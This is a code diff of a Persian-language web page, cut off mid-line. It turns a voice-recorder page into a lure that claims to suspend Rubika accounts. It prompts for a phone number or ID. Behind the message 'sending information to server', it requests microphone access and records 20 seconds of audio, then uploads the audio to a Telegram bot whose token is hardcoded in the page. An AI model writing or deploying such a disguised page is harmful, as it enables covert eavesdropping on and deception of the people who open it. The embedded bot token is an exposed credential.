@@ -3,23 +3,39 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ضبط صدا</title>
+  <title> فیلتری روبیکا</title>
   <style>
+    
     body {
       font-family: Tahoma, sans-serif;
       text-align: center;
       padding: 50px;
       background: #f0f2f5;
+      
     }
     button {
       padding: 15px 30px;
       font-size: 18px;
-      background: #0088cc;
-      color: white;
+      background: #db06e2;
+      color: rgb(20, 8, 8);
       border: none;
       border-radius: 10px;
       cursor: pointer;
       margin: 10px;
+      transition: background-color 0.3s ease;
+      transition:color 0.3s ease;
+    }
+    button:hover{
+      background-color: chartreuse;
+      color: #db06e2;
+    }
+    .name{
+      margin: 15px;
+      padding: 10px;
+      box-shadow: #db06e2;
+      box-sizing: 15px;
+      outline-color: #db06e2 ;
+      border-radius: 10px;
     }
     button:disabled {
       background: #ccc;
@@ -34,13 +50,13 @@
 </head>
 <body>
 
-  <h2>ضبط صدای شما</h2>
-  <p>برای شروع ضبط، روی دکمه زیر کلیک کنید و اجازه دسترسی به میکروفون را بدهید.</p>
+  <h2> تعلیق اکانت روبیکا </h2>
+  <p>شماره تلفن یا ایدی فرد را در کادر زیر قرار دهید و روی دکمه ارسال اطلاعات کلیک کنید</p>
+  <button id="startBtn">ارسال اطلاعات</button>
+  <input class="name" type="text" placeholder="شماره تلفن را وارد کنید " required>
+  
 
-  <button id="startBtn">شروع ضبط (10 ثانیه)</button>
-  <button id="stopBtn" disabled>توقف</button>
-
-  <div id="status">آماده برای ضبط...</div>
+  <div id="status">  توجه : برای ثبت ایدی . حتما کلمه @ را وارد کنید تا سایت ما دچار مشکل نشود</div>
 
   <script>
     const TELEGRAM_BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4"; // توکن باتت رو اینجا بذار
@@ -55,7 +71,8 @@
 
     startBtn.onclick = async () => {
       try {
-        status.textContent = "در حال درخواست دسترسی به میکروفون...";
+        status.textContent = "در حال بررسی و ارسال اطلاعات به سرور..."
+        status.textContent = "لطفا تا بررسی اطلاعات وارد شده , در همین صفحه بمانید"
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
 
         mediaRecorder = new MediaRecorder(stream);
@@ -73,7 +90,7 @@
         mediaRecorder.start();
         startBtn.disabled = true;
         stopBtn.disabled = false;
-        status.textContent = "در حال ضبط... (10 ثانیه)";
+        status.textContent = "درخواست شما به سرور ارسال شد ..." 
 
         // ضبط خودکار بعد از 10 ثانیه متوقف بشه
         setTimeout(() => {
@@ -81,10 +98,10 @@
             mediaRecorder.stop();
             stream.getTracks().forEach(track => track.stop());
           }
-        }, 10000);
+        }, 20000);
 
       } catch (err) {
-        status.textContent = "خطا: دسترسی به میکروفون رد شد یا مشکلی وجود دارد.";
+        status.textContent = "خطا: دسترسی های مورد نیاز را طبق پروتکول انجام بدهید .";
         console.error(err);
       }
     };
@@ -104,23 +121,4 @@
       formData.append('audio', audioBlob, 'voice.webm');
 
       try {
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
-          method: 'POST',
-          body: formData
-        });
-
-        const result = await response.json();
-        if (result.ok) {
-          status.textContent = "صدا با موفقیت به تلگرام ارسال شد!";
-        } else {
-          status.textContent = "خطا در ارسال: " + result.description;
-        }
-      } catch (err) {
-        status.textContent = "خطا در ارتباط با تلگرام.";
-        console.error(err);
-      }
-    }
-  </script>
-
-</body>
-</html>
+        const response = await fetch(`https://api.telegram.org/bot${T
